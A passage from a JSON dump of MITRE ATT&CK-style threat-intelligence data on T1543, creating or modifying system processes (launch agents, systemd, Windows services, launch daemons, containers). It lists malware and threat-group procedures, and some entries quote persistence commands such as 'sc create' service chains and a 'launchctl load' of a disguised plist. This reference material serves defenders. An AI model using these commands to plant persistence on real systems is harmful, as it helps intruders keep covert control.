                        "Name": "Komplex",
                        "Description": "The <name> trojan creates a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist with launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist.[5]"
                    },
                    "S1016": {
                        "ID": "S1016",
                        "Name": "MacMa",
                        "Description": "<name> installs a com.apple.softwareupdate.plist file in the /LaunchAgents folder with the RunAtLoad value set to true. Upon user login, <name> is executed from /var/root/.local/softwareupdate with root privileges. Some variations also include the LimitLoadToSessionType key with the value Aqua, ensuring the <name> only runs when there is a logged in GUI user.[21][22]"
                    },
                    "S1048": {
                        "ID": "S1048",
                        "Name": "macOS.OSAMiner",
                        "Description": "<name> has placed a Stripped Payloads with a plist extension in the Launch Agent's folder. [23]"
                    },
                    "S0282": {
                        "ID": "S0282",
                        "Name": "MacSpy",
                        "Description": "<name> persists via a Launch Agent.[16]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> can use launch agents for persistence.[24]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> can create a persistence file in the folder /Library/LaunchAgents.[25][26]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> persists via Launch Agent.[16]"
                    },
                    "S0595": {
                        "ID": "S0595",
                        "Name": "ThiefQuest",
                        "Description": "<name> installs a launch item using an embedded encrypted launch agent property list template. The plist file is installed in the ~/Library/LaunchAgents/ folder and configured with the path to the persistent binary located in the ~/Library/ folder.[27]"
                    }
                }
            },
            "002": {
                "name": "Systemd Service",
                "href": "/techniques/T1543/002",
                "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.[1] Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  Systemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME).[2] Inside the .service unit files, the following directives are used to execute commands:[3] ExecStart, ExecStartPre, and ExecStartPost directives execute when a service is started manually by systemctl or on system start if the service is set to automatically start.ExecReload directive executes when a service restarts. ExecStop, ExecStopPre, and ExecStopPost directives execute when a service is stopped.  Adversaries have created new service files, altered the commands a .service file\u2019s directive executes, and modified the user directive a .service file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.[4][5][6] The .service file\u2019s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions.",
                "Procedure": {
                    "C0034": {
                        "ID": "C0034",
                        "Name": "2022 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team configured Systemd to maintain persistence of GOGETTER, specifying the WantedBy=multi-user.target configuration to run GOGETTER when the system begins accepting user logins.[7]"
                    },
                    "S0401": {
                        "ID": "S0401",
                        "Name": "Exaramel for Linux",
                        "Description": "<name> has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.[8][9]"
                    },
                    "S0410": {
                        "ID": "S0410",
                        "Name": "Fysbis",
                        "Description": "<name> has established persistence using a systemd service.[10]"
                    },
                    "S0601": {
                        "ID": "S0601",
                        "Name": "Hildegard",
                        "Description": "<name> has started a monero service.[11]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can be used to establish persistence using a systemd service.[12]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has installed a systemd service script to maintain persistence.[4]"
                    },
                    "S1078": {
                        "ID": "S1078",
                        "Name": "RotaJakiro",
                        "Description": "Depending on the Linux distribution and when executing with root permissions, <name> may install persistence using a .service file under the /lib/systemd/system/ folder.[13]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> can copy a script to the user owned /usr/lib/systemd/system/ directory with a symlink mapped to a root owned directory, /etc/ystem/system, in the unit configuration file's ExecStart directive to establish persistence and elevate privileges.[14]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has established persistence through the creation of a cryptocurrency mining system service using systemctl.[15][16]"
                    }
                }
            },
            "003": {
                "name": "Windows Service",
                "href": "/techniques/T1543/003",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.[1] Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe.[2][3][4] Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.[5][4]Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution.To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., Hide Artifacts), for example by using the sc sdset command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as Get-Service, sc query, and services.exe.[6][7]",
                "Procedure": {
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team used an arbitrary system service to load at system boot for persistence for Industroyer. They also replaced the ImagePath registry value of a Windows service with a new backdoor binary. [8]"
                    },
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> can establish persistence by creating a service.[9]"
                    },
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> can install itself as a service.[10]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "An <name> Port 22 malware variant registers itself as a service.[11]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has a tool that creates a new service for persistence.[12]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> modified Windows Services to ensure PowerShell scripts were loaded on the system. <name> also creates a Windows service to establish persistence.[13][14][15]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has installed a new Windows service to establish persistence.[16]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> modified legitimate Windows services to install malware backdoors.[17][18] <name> created the StorSyncSvc service to provide persistence for Cobalt Strike.[19]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name>'s dispatcher can establish persistence by registering a new service.[20]"
                    },
                    "S0347": {
                        "ID": "S0347",
                        "Name": "AuditCred",
                        "Description": "<name> is installed as a new service on the system.[21]"
                    },
                    "S0239": {
                        "ID": "S0239",
                        "Name": "Bankshot",
                        "Description": "<name> can terminate a specific process by its process id.[22][23]"
                    },
                    "S0127": {
                        "ID": "S0127",
                        "Name": "BBSRAT",
                        "Description": "<name> can modify service configurations.[24]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has been modified to be used as a Windows service.[25]"
                    },
                    "S0570": {
                        "ID": "S0570",
                        "Name": "BitPaymer",
                        "Description": "<name> has attempted to install itself as a service to maintain persistence.[26]"
                    },
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "<name> can create a new service to establish persistence.[27][28]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "One variant of <name> creates a new service using either a hard-coded or randomly generated name.[29]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has made their XMRIG payloads persistent as a Windows Service.[30]"
                    },
                    "S0204": {
                        "ID": "S0204",
                        "Name": "Briba",
                        "Description": "<name> installs a service pointing to a malicious DLL dropped to disk.[31]"
                    },
                    "G0008": {
                        "ID": "G0008",
                        "Name": "Carbanak",
                        "Description": "<name> malware installs itself as a service to provide persistence and SYSTEM privileges.[32]"
                    },
                    "S0335": {
                        "ID": "S0335",
                        "Name": "Carbon",
                        "Description": "<name> establishes persistence by creating a service and naming it based off the operating system version running on the current machine.[33]"
                    },
                    "S0261": {
                        "ID": "S0261",
                        "Name": "Catchamas",
                        "Description": "<name> adds a new service named NetAdapter to establish persistence.[34]"
                    },
                    "G1021": {
                        "ID": "G1021",
                        "Name": "Cinnamon Tempest",
                        "Description": "<name> has created system services to establish persistence for deployed tooling.[35]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> can register itself as a system service to gain persistence.[36]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has created new services to establish persistence.[37]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can install a new service.[38]"
                    },
                    "S0608": {
                        "ID": "S0608",
                        "Name": "Conficker",
                        "Description": "<name> copies itself into the %systemroot%\\system32 directory and registers as a service.[39]"
                    },
                    "S0050": {
                        "ID": "S0050",
                        "Name": "CosmicDuke",
                        "Description": "<name> uses Windows services typically named \"javamtsup\" for persistence.[40]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "One persistence mechanism used by <name> is to register itself as a Windows service.[41]"
                    },
                    "S0625": {
                        "ID": "S0625",
                        "Name": "Cuba",
                        "Description": "<name> can modify services by using the OpenService and ChangeServiceConfig functions.[42]"
                    },
                    "G0105": {
                        "ID": "G0105",
                        "Name": "DarkVishnya",
                        "Description": "<name> created new services for shellcode loaders distribution.[43]"
                    },
                    "S1033": {
                        "ID": "S1033",
                        "Name": "DCSrv",
                        "Description": "<name> has created new services for persistence by modifying the Registry.[44]"
                    },
                    "S0567": {
                        "ID": "S0567",
                        "Name": "Dtrack",
                        "Description": "<name> can add a service called WBService to establish persistence.[45]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "<name> creates a new service that loads a malicious driver when the system starts. When <name> is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key.[46]"
                    },
                    "S0024": {
                        "ID": "S0024",
                        "Name": "Dyre",
                        "Description": "<name> registers itself as a service by adding several Registry keys.[47]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> created a service using the command sc create \"SysUpdate\" binpath= \"cmd /c start \"[file path]\"\"&&sc config \"SysUpdate\" start= auto&&netstart SysUpdate for persistence.[48]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "<name> configures itself as a service.[49]"
                    },
                    "S0082": {
                        "ID": "S0082",
                        "Name": "Emissary",
                        "Description": "<name> is capable of configuring itself as a service.[50]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has been observed creating new services to maintain persistence.[51][52][53]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can utilize built-in modules to modify service binaries and restore them to their original state.[54]"
                    },
                    "S0343": {
                        "ID": "S0343",
                        "Name": "Exaramel for Windows",
                        "Description": "The <name> dropper creates and starts a Windows service named wsmprovav with the description \"Windows Check AV.\"[55]"
                    },
                    "S0181": {
                        "ID": "S0181",
                        "Name": "FALLCHILL",
                        "Description": "<name> has been installed as a Windows service.[10]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> created new Windows services and added them to the startup directories for persistence.[56]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> creates a new Windows service with the malicious executable for persistence.[57][58]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "<name> has established persistence by running sc.exe and by setting the WSearch service to run automatically.[59]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> can drop itself in C:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dll as an alternative Print Processor to be loaded automatically when the spoolsv Windows service starts.[60]"
                    },
                    "S0032": {
                        "ID": "S0032",
                        "Name": "gh0st RAT",
                        "Description": "<name> can create a new service to establish persistence.[61][62]"
                    },
                    "S0493": {
                        "ID": "S0493",
                        "Name": "GoldenSpy",
                        "Description": "<name> has established persistence by running in the background as an autostart service.[63]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> chooses a service, drops a DLL file, and writes it to that serviceDLL Registry key.[64]"
                    },
                    "S0071": {
                        "ID": "S0071",
                        "Name": "hcdLoader",
                        "Description": "<name> installs itself as a service for persistence.[65][66]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> can load drivers by creating a new service using the CreateServiceW API.[3]"
                    },
                    "S0203": {
                        "ID": "S0203",
                        "Name": "Hydraq",
                        "Description": "<name> creates new services to establish persistence.[67][68][69]"
                    },
                    "S0604": {
                        "ID": "S0604",
                        "Name": "Industroyer",
                        "Description": "<name> can use an arbitrary system service to load at system boot for persistence and replaces the ImagePath registry value of a Windows service with a new backdoor binary.[8]"
                    },
                    "S0259": {
                        "ID": "S0259",
                        "Name": "InnaputRAT",
                        "Description": "Some <name> variants create a new Windows service to establish persistence.[70]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can register a Windows service named CsPower as part of its execution chain, and a Windows service named clr_optimization_v2.0.51527_X86 to achieve persistence.[5]"
                    },
                    "S0044": {
                        "ID": "S0044",
                        "Name": "JHUHUGIT",
                        "Description": "<name> has registered itself as a service to establish persistence.[71]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> can install itself as a new service.[72]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> backdoor RoyalDNS established persistence through adding a service called Nwsapagent.[73]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> installs a service pointing to a malicious DLL dropped to disk.[74]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has created new services for persistence.[75][76]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has registered itself as a service using its export function.[77]"
                    },
                    "S0236": {
                        "ID": "S0236",
                        "Name": "Kwampirs",
                        "Description": "<name> creates a new service named WmiApSrvEx to establish persistence.[78]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "Several <name> malware families install themselves as new services.[79][80]"
                    },
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> can automatically launch a Linux virtual machine as a service at startup if the AutoStart option is enabled in the VBoxVmService configuration file.[81]"
                    },
                    "S0149": {
                        "ID": "S0149",
                        "Name": "MoonWind",
                        "Description": "<name> installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.[82]"
                    },
                    "S0205": {
                        "ID": "S0205",
                        "Name": "Naid",
                        "Description": "<name> creates a new service to establish.[83]"
                    },
                    "S0630": {
                        "ID": "S0630",
                        "Name": "Nebulae",
                        "Description": "<name> can create a service to establish persistence.[84]"
                    },
                    "S0210": {
                        "ID": "S0210",
                        "Name": "Nerex",
                        "Description": "<name> creates a Registry subkey that registers a new service.[85]"
                    },
                    "S0118": {
                        "ID": "S0118",
                        "Name": "Nidiran",
                        "Description": "<name> can create a new service named msamger (Microsoft Security Accounts Manager).[86]"
                    },
                    "S1090": {
                        "ID": "S1090",
                        "Name": "NightClub",
                        "Description": "<name> has created a Windows service named WmdmPmSp to establish persistence.[87]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> can create the services httpsvc and w3esvc for persistence .[88]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "To establish persistence, <name> can install itself as a new service named NtmSsvc.[89]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors modified the IKEEXT and PrintNotify Windows services for persistence.[90]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, threat actors installed DLLs and backdoors as Windows services.[91]"
                    },
                    "S0664": {
                        "ID": "S0664",
                        "Name": "Pandora",
                        "Description": "<name> has the ability to gain system privileges through Windows services.[92]"
                    },
                    "S1031": {
                        "ID": "S1031",
                        "Name": "PingPull",
                        "Description": "<name> has the ability to install itself as a service.[93]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "<name> can establish persistence by registering a malicious DLL as an alternative Print Processor which is loaded when the print spooler service starts.[94]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> can be added as a service to establish persistence. <name> also has a module to change service configurations as well as start, control, and delete services.[95][96][97][98][99]"
                    },
                    "S0012": {
                        "ID": "S0012",
                        "Name": "PoisonIvy",
                        "Description": "<name> creates a Registry subkey that registers a new service. <name> also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.[100]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs.[101][102]"
                    },
                    "G0056": {
                        "ID": "G0056",
                        "Name": "PROMETHIUM",
                        "Description": "<name> has created new services and modified existing services for persistence.[103]"
                    },
                    "S0029": {
                        "ID": "S0029",
                        "Name": "PsExec",
                        "Description": "<name> can leverage Windows services to escalate privileges from administrator to SYSTEM with the -s argument.[104]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can remotely create a temporary service on a target host.[105]"
                    },
                    "S0481": {
                        "ID": "S0481",
                        "Name": "Ragnar Locker",
                        "Description": "<name> has used sc.exe to create a new service for the VirtualBox driver.[106]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> can use services to establish persistence.[84]"
                    },
                    "S0169": {
                        "ID": "S0169",
                        "Name": "RawPOS",
                        "Description": "<name> installs itself as a service to maintain persistence.[107][108][109]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> has created a service when it is installed on the victim machine.[110]"
                    },
                    "S0172": {
                        "ID": "S0172",
                        "Name": "Reaver",
                        "Description": "<name> installs itself as a new service.[111]"
                    },
                    "S0074": {
                        "ID": "S0074",
                        "Name": "Sakula",
                        "Description": "Some <name> samples install themselves as services for persistence by calling WinExec with the net start argument.[112]"
                    },
                    "S1099": {
                        "ID": "S1099",
                        "Name": "Samurai",
                        "Description": "<name> can create a service at HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost to trigger execution and maintain persistence.[88]"
                    },
                    "S0345": {
                        "ID": "S0345",
                        "Name": "Seasalt",
                        "Description": "<name> is capable of installing itself as a service.[113]"
                    },
                    "S0140": {
                        "ID": "S0140",
                        "Name": "Shamoon",
                        "Description": "<name> creates a new service named \"ntssrv\" to execute the payload. Newer versions create the \"MaintenaceSrv\" and \"hdv_725x\" services.[114][115]"
                    },
                    "S0444": {
                        "ID": "S0444",
                        "Name": "ShimRat",
                        "Description": "<name> has installed a Windows service to maintain persistence on victim machines.[116]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can establish persistence by creating a new service.[117]"
                    },
                    "S0533": {
                        "ID": "S0533",
                        "Name": "SLOTHFULMEDIA",
                        "Description": "<name> has created a service on victim machines named \"TaskFrame\" to establish persistence.[118]"
                    },
                    "S1037": {
                        "ID": "S1037",
                        "Name": "STARWHALE",
                        "Description": "<name> has the ability to create the following Windows service to establish persistence on an infected host: sc create Windowscarpstss binpath= \"cmd.exe /c cscript.exe c:\\\\windows\\\\system32\\\\w7_1.wsf humpback_whale\" start= \"auto\" obj= \"LocalSystem\".[119]"
                    },
                    "S0142": {
                        "ID": "S0142",
                        "Name": "StreamEx",
                        "Description": "<name> establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.[120]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> has created new services and modified existing services for persistence.[121]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> uses a driver registered as a boot start service as the main load-point.[122]"
                    },
                    "S1049": {
                        "ID": "S1049",
                        "Name": "SUGARUSH",
                        "Description": "<name> has created a service named Service1 for persistence.[123]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> can create a service to establish persistence.[92]"
                    },
                    "S0164": {
                        "ID": "S0164",
                        "Name": "TDTESS",
                        "Description": "If running as administrator, <name> installs itself as a new service named bmwappushservice to establish persistence.[124]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has used malware that adds cryptocurrency miners as a service.[125]"
                    },
                    "S0560": {
                        "ID": "S0560",
                        "Name": "TEARDROP",
                        "Description": "<name> ran as a Windows service from the c:\\windows\\syswow64 folder.[126][127]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name>'s malware can create a new service, sometimes naming it after the config information, to gain persistence.[128][129]"
                    },
                    "S0665": {
                        "ID": "S0665",
                        "Name": "ThreatNeedle",
                        "Description": "<name> can run in memory and register its payload as a Windows service.[130]"
                    },
                    "S0004": {
                        "ID": "S0004",
                        "Name": "TinyZBot",
                        "Description": "<name> can install as a Windows service for persistence.[131]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> establishes persistence by creating an autostart service that allows it to run whenever the machine boots.[132]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has installed a service pointing to a malicious DLL dropped to disk.[133]"
                    },
                    "S0263": {
                        "ID": "S0263",
                        "Name": "TYPEFRAME",
                        "Description": "<name> variants can add malicious DLL modules as new services.<name> can also delete services from the victim\u2019s machine.[134]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> has registered a service, typically named WerFaultSvc, to decrypt and find a kernel driver and kernel driver loader to maintain persistence.[135]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has registered itself as a system service in the Registry for automatic execution at system startup.[136]"
                    },
                    "S0180": {
                        "ID": "S0180",
                        "Name": "Volgmer",
                        "Description": "<name> installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry. Some <name> variants also install .dll files as services with names generated by a list of hard-coded strings.[137][138][139]"
                    },
                    "S0366": {
                        "ID": "S0366",
                        "Name": "WannaCry",
                        "Description": "<name> creates the service \"mssecsvc2.0\" with the display name \"Microsoft Security Center (2.0) Service.\"[140][141]"
                    },
                    "S0612": {
                        "ID": "S0612",
                        "Name": "WastedLocker",
                        "Description": "<name> created and established a service that runs until the encryption process is complete.[142]"
                    },
                    "S0206": {
                        "ID": "S0206",
                        "Name": "Wiarp",
                        "Description": "<name> creates a backdoor through which remote attackers can create a service.[143]"
                    },
                    "S0176": {
                        "ID": "S0176",
                        "Name": "Wingbird",
                        "Description": "<name> uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.[144][145]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "<name> sets its DLL file as a new service in the Registry to establish persistence.[146]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has installed TrickBot as a service named ControlServiceA in order to establish persistence.[147][148]"
                    },
                    "S0230": {
                        "ID": "S0230",
                        "Name": "ZeroT",
                        "Description": "<name> can add a new service to ensure PlugX persists on the system when delivered as another payload onto the system.[99]"
                    },
                    "S0086": {
                        "ID": "S0086",
                        "Name": "ZLib",
                        "Description": "<name> creates Registry keys to allow itself to run as various services.[149]"
                    },
                    "S0350": {
                        "ID": "S0350",
                        "Name": "zwShell",
                        "Description": "<name> has established persistence by adding itself as a new service.[150]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> can create a new service using the service parser function ProcessScCommand.[151]"
                    }
                }
            },
            "004": {
                "name": "Launch Daemon",
                "href": "/techniques/T1543/004",
                "description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in /System/Library/LaunchDaemons/ and /Library/LaunchDaemons/. Required Launch Daemons parameters include a Label to identify the task, Program to provide a path to the executable, and RunAtLoad to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.[1][2][3]Adversaries may install a Launch Daemon configured to execute at startup by using the RunAtLoad parameter set to true and the Program parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions.[4][5]Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as usr/local/bin to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.[6][7]",
                "Procedure": {
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has placed a plist file within the LaunchDaemons folder and launched it manually.[8][9]"
                    },
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> can persist via a LaunchDaemon.[10]"
                    },
                    "S1105": {
                        "ID": "S1105",
                        "Name": "COATHANGER",
                        "Description": "<name> will create a daemon for timed check-ins with command and control infrastructure.[11]"
                    },
                    "S0497": {
                        "ID": "S0497",
                        "Name": "Dacls",
                        "Description": "<name> can establish persistence via a Launch Daemon.[12][13]"
                    },
                    "S0690": {
                        "ID": "S0690",
                        "Name": "Green Lambert",
                        "Description": "<name> can add a plist file in the Library/LaunchDaemons to establish persistence.[14][15]"
                    },
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> adds plist files with the naming format com.[random_name].plist in the /Library/LaunchDaemons folder with the RunAtLoad and KeepAlive keys set to true.[16]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "If running with root permissions, <name> can create a persistence file in the folder /Library/LaunchDaemons.[17][18]"
                    },
                    "S0595": {
                        "ID": "S0595",
                        "Name": "ThiefQuest",
                        "Description": "When running with root privileges after a Launch Agent is installed, <name> installs a plist file to the /Library/LaunchDaemons/ folder with the RunAtLoad key set to true establishing persistence as a Launch Daemon. [19]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> uses the ssh launchdaemon to elevate privileges, bypass system controls, and enable remote access to the victim.[20]"
                    }
                }
            },
            "005": {
                "name": "Container Service",
                "href": "/techniques/T1543/005",
                "description": "Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.For example, by using the docker run or podman run command with the restart=always directive, a container can be configured to persistently restart on the host.[1] A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.[2]In Kubernetes environments, DaemonSets allow an adversary to persistently Deploy Containers on all nodes, including ones added later to the cluster.[3][4] Pods can also be deployed to specific nodes using the nodeSelector or nodeName fields in the pod spec.[5][6]Note that containers can also be configured to run as Systemd Services.[7][8]",
                "Procedure": {}
            }
        },
        "tactic": "Persistence",
        "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.[1] On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters.[2] Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.[3]",
        "Procedure": {
            "S0401": {
                "ID": "S0401",
                "Name": "Exaramel for Linux",
                "Description": "malware has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root.[4]"
            },
            "S1121": {
                "ID": "S1121",
                "Name": "LITTLELAMB.WOOLTEA",
                "Description": "malware can initialize itself as a daemon to run persistently in the background.[5]"
            }
        }
    },
    "T1546": {
        "ttp_name": "Event Triggered Execution",
        "ttp_id": "T1546",
